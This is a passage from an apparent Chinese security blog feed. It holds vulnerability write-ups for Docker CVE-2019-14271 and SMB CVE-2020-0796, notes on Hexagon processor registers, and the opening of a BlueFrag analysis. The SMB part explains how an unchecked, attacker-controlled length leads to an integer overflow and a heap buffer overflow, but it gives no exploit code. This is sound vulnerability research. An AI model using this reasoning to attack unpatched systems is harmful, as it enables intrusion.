映射了容器外的内容</p><p>2、容器外的 tmp 的 hack 写入 <code>hack by chaitin</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183342.png" title="mount-root-fs-to" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183342.png" alt="mount-root-fs-to"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183355.png" title="docker%20CVE%202019%2014271%20040822a50127454aac6713a0750ab5fb/Untitled%202.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183355.png" alt="docker%20CVE%202019%2014271%20040822a50127454aac6713a0750ab5fb/Untitled%202.png"></a></p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p><a href="https://github.com/moby/moby/pull/39612/files/a316b10dab79d9298b02c7930958ed52e0ccf4e4#diff-7d8fc0dcb0916621d523276add8210c2](https://github.com/moby/moby/pull/39612/files/a316b10dab79d9298b02c7930958ed52e0ccf4e4#diff-7d8fc0dcb0916621d523276add8210c2)">patch diif</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183400.png" title="patch-diff" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183400.png" alt="patch-diff"></a></p><p>补丁新增了 <code>init</code> 函数，强制进程进入到容器内的时候，先加载容器外的 so 文件</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/">https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/</a></p></blockquote></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CVE-2019-14271 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0796 分析</title>
      <link href="CVE-2020-0796-analysis.html"/>
      <url>CVE-2020-0796-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="CVE-2020-0796"><a href="#CVE-2020-0796" class="headerlink" title="CVE-2020-0796"></a>CVE-2020-0796</h1><p>3月13日 凌晨左右 ，微软放了这个漏洞的补丁…所以稍微分析一下他的补丁</p><h2 id="Bindiff"><a href="#Bindiff" class="headerlink" title="Bindiff"></a>Bindiff</h2><p>通过 bindiff 比较发现一个函数，且名字也蛮可疑的..</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032004.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032004.png" style="zoom: 50%;" /></a><p>这个函数名叫 <code>Srv2DecompressData</code> 实际上和漏洞描述其实也差不多..</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032123.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032123.png" style="zoom: 50%;" /></a><p>似乎是加了检查..我们 打开IDA来比对一下 两者的差别..</p><h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032244.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032244.png"></a></p><p>左边是有漏洞的版本，右边是 Patch 后的版本 .. 比对了一下发现似乎增加了一个检查..尤其是增加的一个叫</p><p><code>RtlULongAdd</code> 的函数..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RtlULongAdd(ULONG ulAugend, ULONG ulAddend, ULONG *pulResult)</span><br></pre></td></tr></table></figure><p>该函数的参数是 两个似乎 recve 的数据 以及一个变量..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">RtlULongAdd</span><span class="params">(ULONG ulAugend, ULONG ulAddend, ULONG *pulResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ULONG v3; <span class="comment">// eax</span></span><br><span class="line">  ULONG v4; <span class="comment">// edx</span></span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = ulAugend + ulAddend;</span><br><span class="line">  v4 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt;= ulAugend )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  result = v3 &lt; ulAugend ? <span class="number">0xC0000095</span> : <span class="number">0</span>;</span><br><span class="line">  *pulResult = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了一下这个  判断了  ulAugend + ulAddend 相加后的和是否小于其中一个 加数..如果是则将其中一个赋值给返回值..从这里大概能初步判断是个什么漏洞了..基本能猜测是个  整型溢出..</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>我们来看一下未打补丁的版本…</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032734.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032734.png"></a></p><p>看了一下..这里是将原本个值直接相加，并没有进行checkl… 然后分配内存..如果有问题 …应该是这里分配的内存太小..导致后续的缓冲区溢出吧？</p><p>由于我对这两个值不是很熟悉..所以这个时候开始查资料..</p><p>这个时候发现已经有人发文了…参考链接最后贴后面..</p><p>可以知道的是..这里的值一个是 OriginalCompressedSegmentSize  一个是 Offset/Length，他们 描述如下:</p><blockquote><ol><li>OriginalCompressedSegmentSize (4 bytes) The size, in bytes, of the uncompressed data segment.</li><li>Offset/Length (4 bytes) If SMB2_COMPRESSION_FLAG_CHAINED is set in Flags field, this field MUST be interpreted as Length. The length, in bytes, of the compressed payload. Otherwise, this field MUST be interpreted as Offset. The offset, in bytes, from the end of this structure to the start of compressed data segment.</li></ol></blockquote><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033313.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033313.png"></a></p><p>然后做了什么事情呢？</p><p>看代码，将分配的内存 用 SmbCompressionDecompress 这个函数进行处理</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033424.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033424.png"></a></p><p>我在 srvnet 里找到了 SmbCompressionDecompress 这个函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033623.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033623.png"></a></p><p>然后又调用了 <code>RtlDecompressBufferEx2</code> 这个函数..最后调的是 <code>RtlDecompressBufferXpressLz</code> 这个函数…</p><p>这个函数在<code>ntoskrnl. exe</code> 里</p><p>这个函数做的是事情就是..</p><p><code>memcpy(ptr,src,len)</code></p><p>ptr 是由 <code>SrvNetAllocateBuffer</code>分配的<code>UncompressBuffer</code>，<code>len</code> 是从smb 包解析的解压数据的大小，这个值是攻击者可控的， 由于前面没有检查..所以我们传入一个很大的值，使其触发整型溢出.分配一个较小的内存…此时 len又是一个大的值..所以导致了缓冲区溢出</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200314024525.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200314024525.png"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0</a></p><p><a href="http://blogs.360.cn/post/CVE-2020-0796.html">http://blogs.360.cn/post/CVE-2020-0796.html</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-0796 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexagon 学习 --- 寄存器篇</title>
      <link href="Herxagon%20%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0.html"/>
      <url>Herxagon%20%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Hexagon-学习"><a href="#Hexagon-学习" class="headerlink" title="Hexagon 学习"></a>Hexagon 学习</h1><p>就是按照手册过了一遍，仅仅是个人的笔记。</p><h2 id="Registers-寄存器"><a href="#Registers-寄存器" class="headerlink" title="Registers 寄存器"></a>Registers 寄存器</h2><blockquote><p>The Hexagon processor has two sets of registers: general registers and control registers. The general registers include thirty-two 32-bit registers (named R0 through R31) which can be accessed either as single registers or as aligned 64-bit register pairs. The general registers are used to contain all pointer, scalar, vector, and accumulator data. The control registers include special-purpose registers such as program counter, status register, loop registers, etc.</p></blockquote><p>分为通用寄存器和控制寄存器， 通用寄存器包括32个32位寄存器，以R0到R31命名，另外这里提到了可以通过定义一个寄存器对来表示一个64位寄存器..例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R1：0 &#x3D;memd(R3)          &#x2F;&#x2F;导入双字</span><br><span class="line">R7:6&#x3D;valignb(R9:8,R7:6,#2)   &#x2F;&#x2F;适量对齐</span><br></pre></td></tr></table></figure><h3 id="寄存器对"><a href="#寄存器对" class="headerlink" title="寄存器对"></a>寄存器对</h3><p>下图显示了寄存器对的结构</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312032950.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312032950.png"></a> </p><p>在这些通用寄存器当中，R29-R32被用来支持子程序的调用以及程序栈，这些寄存器可以无保留的被子程序调用或栈指令改变。在编程环境中，R29-R32可以用符号来表示。例如：</p><p>  SP=add(SP,#-8)    //sp是R29的别名</p><p>  Allocfram             //更改寄存器R29(SP)以及R30（FP）</p><p>  call init                //更改LR（R31）</p><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>下图显示了这些别名后的通用寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For example:</span><br><span class="line">SP &#x3D; add(SP, #-8) &#x2F;&#x2F; SP is alias of R29</span><br><span class="line">allocframe &#x2F;&#x2F; Modifies SP (R29) and FP (R30)</span><br><span class="line">call init &#x2F;&#x2F; Modifies LR (R31)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033255.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033255.png"></a></p><p>在这些通用寄存器当中，R29-R32被用来支持子程序的调用以及程序栈，这些寄存器可以无保留的被子程序调用或栈指令改变。在编程环境中，R29-R32可以用符号来表示。</p><h3 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h3><p>Hexagon处理器包含了一系列的32位的控制寄存器，这些寄存器可以让我们对处理器中的PC，硬件回路以及矢量分支预测进行操作。</p><p> 与通用寄存器不同，控制寄存器中有些特殊的控制寄存器可用来当做操作数，有时候寄存器可以被转换成指令从而被用作操作数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For example:</span><br><span class="line">R2 &#x3D; memw(R0++M1) &#x2F;&#x2F; Auto-increment addressing mode (M1)</span><br><span class="line">R9 &#x3D; PC &#x2F;&#x2F; Get program counter (PC)</span><br><span class="line">LC1 &#x3D; R3 &#x2F;&#x2F; Set hardware loop count (LC1)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033443.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033443.png"></a></p><p>控制寄存器别名规则：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033639.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033639.png"></a></p><p>控制寄存器同样可以被定义为寄存器对从而表示一个64位的寄存器，控制寄存器的凑对使用别名来定义，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1:0 &#x3D; R5:4 &#x2F;&#x2F; C1:0 specifies the LC0&#x2F;SA0 register pair</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033809.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033809.png"></a></p><h4 id="程序计数器-Program-Counter（PC）"><a href="#程序计数器-Program-Counter（PC）" class="headerlink" title="程序计数器 Program Counter（PC）"></a>程序计数器 Program Counter（PC）</h4><p>PC 寄存器是用来指向下一个指令的位置. 他可以通过指令的执行来间接修改，也可被直接读取例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R7 &#x3D; PC &#x2F;&#x2F; Get program counter</span><br></pre></td></tr></table></figure><p>NOTE The PC register is read-only: writing to it has no effect.</p><h4 id="循环寄存器-Loop-registers"><a href="#循环寄存器-Loop-registers" class="headerlink" title="循环寄存器 Loop registers"></a>循环寄存器 Loop registers</h4><p>Hewxagon 的处理器包括两组循环寄存器用来支持嵌套的硬件循环, 每个循环包含了循环计数器以及循环开始位置的寄存器。循环寄存器可以通过 loop 指令修改，同时也可以直接访问，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loop0(start, R4) &#x2F;&#x2F; Modifies LC0 and SA0 (LC0&#x3D;R4, SA0&#x3D;&amp;start)</span><br><span class="line">LC1 &#x3D; R22 &#x2F;&#x2F; Set loop1 count</span><br><span class="line">R9 &#x3D; SA1 &#x2F;&#x2F; Get loop1 start address</span><br></pre></td></tr></table></figure><h4 id="用户状态寄存器-User-Status-register"><a href="#用户状态寄存器-User-Status-register" class="headerlink" title="用户状态寄存器 User  Status register"></a>用户状态寄存器 User  Status register</h4><p>用户状态寄存器（USR）存储可由用户程序访问的处理器状态和控制位。状态位包含某些指令的状态结果，而控制位包含用户可设置的处理器模式，用于硬件预取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9:8 &#x3D; vaddw(R9:8, R3:2):sat &#x2F;&#x2F; Vector add words</span><br><span class="line">R6 &#x3D; USR &#x2F;&#x2F; Get saturation status</span><br></pre></td></tr></table></figure><p>USR 可包含一下的状态和控制值</p><ul><li><p>启用缓存预取 Cache prefetch enable</p></li><li><p>缓存预取状态 Cache prefetch status</p></li><li><p>浮点模式 Floating point modes</p></li><li><p>浮点状态 Floating point status </p></li><li><p>硬件回路配置 Hardware loop configuration</p></li><li><p>Sticky saturation overflow </p></li></ul><blockquote><p>NOTE A user control register transfer to USR cannot be grouped in an instruction packet with a floating point instruction (Section 4.3.4). Whenever a transfer to USR changes the Enable trap bits [29:25], an isync instruction (Section 5.10) must be executed before the new exception programming can take effect.</p></blockquote><h4 id="修饰寄存器-Modifier-registers"><a href="#修饰寄存器-Modifier-registers" class="headerlink" title="修饰寄存器  Modifier registers"></a>修饰寄存器  Modifier registers</h4><p>修饰寄存器用于 （M0-M1） 用于以下寻址模式</p><ul><li><p>间接自动递增寄存器寻址 Indirect auto-increment register addressing</p></li><li><p>循环寻址 Circular addressing</p></li><li><p>bit-reversed 寻址 Bit-reversed addressing</p></li></ul><p><strong>Indirect auto-increment register addressing</strong></p><p>在间接自动递增寄存器寻址中，修改符寄存器存储一个<br>带符号的32位值，用于指定增量（或减量）值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M1 &#x3D; R0 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R3 &#x3D; memw(R2++M1) &#x2F;&#x2F; Load word</span><br></pre></td></tr></table></figure><p><strong>Circular</strong></p><p>在循环寻址中，修饰寄存器存储循环缓冲区的长度和相关的 “k” 和 “I” 的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">M0 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R0 &#x3D; memb(R2++#4:circ(M0)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by R2 with size&#x2F;K vals in M0</span><br><span class="line">R0 &#x3D; memb(R7++I:circ(M1)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by R7 with size&#x2F;K&#x2F;I vals in M1 </span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312144717.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312144717.png"></a></p><p><strong>Bit-reversed</strong></p><p>在位反转寻址中，修改器寄存器存储带符号的32位 指定增量（或减量）值的值。例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">M1 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R2 &#x3D; memub(R0++M1:brev) &#x2F;&#x2F; The address is (R0.H | bitrev(R0.L))</span><br><span class="line"> &#x2F;&#x2F; The orginal R0 (not reversed) is added</span><br><span class="line"> &#x2F;&#x2F; to M1 and written back to R0</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145512.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145512.png"></a></p><h4 id="分支预测寄存器-Predicate-registers"><a href="#分支预测寄存器-Predicate-registers" class="headerlink" title="分支预测寄存器 Predicate registers"></a>分支预测寄存器 Predicate registers</h4><p>分支预测寄存器（P0-P3）保存了标量与矢量对比计算的结果，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">P1 &#x3D; cmp.eq(R2, R3) &#x2F;&#x2F; Scalar compare</span><br><span class="line">if (P1) jump end &#x2F;&#x2F; Jump to address (conditional)</span><br><span class="line">R8 &#x3D; P1 &#x2F;&#x2F; Get compare status (P1 only)</span><br><span class="line">P3:0 &#x3D; R4 &#x2F;&#x2F; Set compare status (P0-P3)</span><br></pre></td></tr></table></figure><p> 这四个分支预测寄存器可被设置成四倍状态，此时此四个寄存器被表示成一个32位的寄存器</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145842.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145842.png"></a></p><h4 id="循环起始寄存器-Circular-start-registers"><a href="#循环起始寄存器-Circular-start-registers" class="headerlink" title="循环起始寄存器 Circular start registers"></a>循环起始寄存器 Circular start registers</h4><p>循环起始寄存器（CS0-CS1）将循环缓冲区的起始地址存储在循环寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CS0 &#x3D; R5 &#x2F;&#x2F; Set circ start register</span><br><span class="line">M0 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R0 &#x3D; memb(R2++#4:circ(M0)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by CS0 with size&#x2F;K vals in M0</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150712.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150712.png"></a></p><h4 id="用户通用指针寄存器-User-general-pointer-register"><a href="#用户通用指针寄存器-User-general-pointer-register" class="headerlink" title="用户通用指针寄存器 User general pointer register"></a>用户通用指针寄存器 User general pointer register</h4><p>The user general pointer (UGP) register is a general-purpose control register.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; UGP &#x2F;&#x2F; Get UGP</span><br><span class="line">UGP &#x3D; R3 &#x2F;&#x2F; Set UGP</span><br></pre></td></tr></table></figure><p>UGP通常用于存储线程本地存储的地址。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150913.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150913.png"></a></p><h4 id="全局指针-Global-pointer"><a href="#全局指针-Global-pointer" class="headerlink" title="全局指针 Global pointer"></a>全局指针 Global pointer</h4><p>全局指针（GP）用于GP相对寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GP &#x3D; R7 &#x2F;&#x2F; Set GP</span><br><span class="line">R2 &#x3D; memw(GP+#200) &#x2F;&#x2F; GP-relative load</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151031.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151031.png"></a></p><h4 id="周期计数寄存器-Cycle-count-registers"><a href="#周期计数寄存器-Cycle-count-registers" class="headerlink" title="周期计数寄存器 Cycle count registers"></a>周期计数寄存器 Cycle count registers</h4><p>周期计数寄存器（UPCYCLELO-UPCYCLEHI）存储一个64位值，其中包含自从上次重置Hexagon处理器以来当前执行的处理器周期数。</p><p>[^NOTE]: The RTOS must grant permission to access these registers. Without this permission, reading these registers from user code always returns zero.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R5 &#x3D; UPCYCLEHI &#x2F;&#x2F; Get cycle count (high)</span><br><span class="line">R4 &#x3D; UPCYCLELO &#x2F;&#x2F; Get cycle count (low)</span><br><span class="line">R5:4 &#x3D; UPCYCLE &#x2F;&#x2F; Get cycle count</span><br></pre></td></tr></table></figure><h4 id="帧限制寄存器-Frame-limit-register"><a href="#帧限制寄存器-Frame-limit-register" class="headerlink" title="帧限制寄存器  Frame limit register"></a>帧限制寄存器  Frame limit register</h4><p>帧限制寄存器（FRAMELIMIT）存储存储区的低地址为软件栈保留</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; FRAMELIMIT &#x2F;&#x2F; Get frame limit register</span><br><span class="line">FRAMELIMIT &#x3D; R3 &#x2F;&#x2F; Set frame limit register</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151516.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151516.png"></a></p><h4 id="栈key寄存器-Frame-key-registe"><a href="#栈key寄存器-Frame-key-registe" class="headerlink" title="栈key寄存器 Frame key registe"></a>栈key寄存器 Frame key registe</h4><p>frame key register  （FRAMEKEY）当它们存储在软件堆栈中时返回地址时用来存储用于XOR加密的密钥值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R2 &#x3D; FRAMEKEY &#x2F;&#x2F; Get frame key register</span><br><span class="line">FRAMEKEY &#x3D; R1 &#x2F;&#x2F; Set frame key register</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151753.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151753.png"></a></p><h4 id="数据包计数寄存器-Packet-count-registers"><a href="#数据包计数寄存器-Packet-count-registers" class="headerlink" title="数据包计数寄存器 Packet count registers"></a>数据包计数寄存器 Packet count registers</h4><p>数据包计数寄存器（PKTCOUNTLO-PKTCOUNTHI）存储一个64位值，其中包含自上次写入PKTCOUNT寄存器以来执行的指令数据包的当前数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; PKTCOUNTHI &#x2F;&#x2F; Get packet count (high)</span><br><span class="line">R8 &#x3D; PKTCOUNTLO &#x2F;&#x2F; Get packet count (low)</span><br><span class="line">R9:8 &#x3D; PKTCOUNT &#x2F;&#x2F; Get packet count</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312153022.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312153022.png"></a></p><h4 id="Qtimer寄存器"><a href="#Qtimer寄存器" class="headerlink" title="Qtimer寄存器"></a>Qtimer寄存器</h4><p>Qtimer寄存器（UTIMERLO-UTIMERHI）提供对Qtimer全局参考计数值的访问。 它们使Hexagon软件能够读取64位时间值，而不必执行昂贵的AHB加载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R5 &#x3D; UTIMERHI &#x2F;&#x2F; Get Qtimer reference count (high)</span><br><span class="line">R4 &#x3D; UTIMERLO &#x2F;&#x2F; Get Qtimer reference count (low)</span><br><span class="line">R5:4 &#x3D; UTIMER &#x2F;&#x2F; Get Qtimer reference count</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312152205.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312152205.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexagon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0022 “BlueFrag”漏洞分析</title>
      <link href="CVE-2020-0022-analysis.html"/>
      <url>CVE-2020-0022-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Android蓝牙子系统“BlueFrag”漏洞分析"><a href="#Android蓝牙子系统“BlueFrag”漏洞分析" class="headerlink" title="Android蓝牙子系统“BlueFrag”漏洞分析"></a>Android蓝牙子系统“BlueFrag”漏洞分析</h2><p>漏洞位于：hci/src/packet_fragmenter.cc</p><h3 id="HCI-层"><a href="#HCI-层" class="headerlink" title="HCI 层"></a>HCI 层</h3><p>HCI 层位于蓝牙协议栈高层协议和低层协议之间，提供了对基带控制器和链路管理器的命令以及访问蓝牙硬件的统一接口方法，其接口适用于BR/EDR控制器、BR/EDR/LE控制器、LE控制器、AMP控制器，与底层的结构关系如下图：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022501.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022501.png"></a></p><h4 id="HCI-包格式"><a href="#HCI-包格式" class="headerlink" title="HCI 包格式"></a>HCI 